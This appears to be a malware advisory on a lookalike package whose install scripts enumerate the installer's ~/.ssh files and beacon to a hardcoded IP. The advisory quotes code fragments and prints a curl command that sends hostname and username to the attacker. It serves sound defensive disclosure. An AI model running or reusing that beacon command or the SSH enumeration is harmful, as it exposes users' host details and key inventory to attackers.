summary: SSH key enumeration and host/user beacon to hardcoded C2 IP 124.221.154.135
details: Package ships a postinstall.js that reads the installer's ~/.ssh directory and POSTs the filenames along with username and platform to hardcoded IP 124.221.154.135 over HTTPS (postinstall.js line 7 reads `path.join(os.homedir(), '.ssh')`; line ~28 sets `hostname: '124.221.154.135'` for a POST /post call). package.json additionally declares a `prebuild` script `curl http://124.221.154.135/pre?c=$(hostname)&u=$(whoami)` that beacons hostname and username in cleartext to the same attacker IP. Comments in the script describe SSH-key theft and C2 transmission. The package name is a low-content lookalike with no legitimate functionality matching the SSH-directory access. Same C2 IP across two independent code paths confirms attacker infrastructure. Installer harm: any consumer of this package risks SSH key inventory disclosure to the attacker, enabling targeted follow-on attacks against the keys' associated hosts/services.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
